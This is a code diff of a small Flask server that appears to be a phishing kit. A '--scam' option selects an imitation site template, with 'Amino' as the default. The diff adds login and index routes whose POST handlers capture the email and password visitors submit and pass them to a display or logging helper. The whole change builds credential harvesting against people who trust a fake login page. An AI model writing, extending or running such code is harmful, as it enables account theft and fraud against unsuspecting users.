@@ -1,5 +1,7 @@
-from flask import Flask
+from flask import Flask, render_template, request
+from scripts import props
 import click
+import subprocess
 
 # The server class has been created; otherwise, when passing the template, 
 # it only loads the initial value None, which gives the problem that it doesn't take the flag.
@@ -17,20 +19,45 @@ class Server:
         global template 
         template = scam
 
+    # *************  GET METHODS  *************
+
     @app.route('/', methods=['GET'])
     def index():
         global template
-        return  template
+        return  render_template(f"{template}/index.html")
+
+    @app.route('/login', methods=['GET'])
+    def login():
+        global template
+        return  render_template(f"{template}/login.html")
+
+    # *************  POST METHODS  *************
 
     @app.route('/', methods=['POST'])
-    def data():
-        return 'Han llegado los datos!!'
+    def get_index():
+        global template
+        email = request.form['email']
+        password = request.form['password']
+
+        props.show_data(email, password)
+
+        return render_template(f"{template}/index.html")
+
+    @app.route('/login', methods=['POST'])
+    def get_login():
+        global template
+        email = request.form['email']
+        password = request.form['password']
+
+        props.show_data(email, password)
+
+        return render_template(f"{template}/index.html")
 
 @click.command() # Initialize flag values
 @click.option("--scam",  '-s', default="Amino")
 @click.option("--port",  '-p', default="5000"  )
 def main(scam, port):
-    Server(scam).app.run(debug=True, port=port)
+    Server(scam).app.run(debug=False, port=port)
 
 if __name__ == '__main__':
     main()
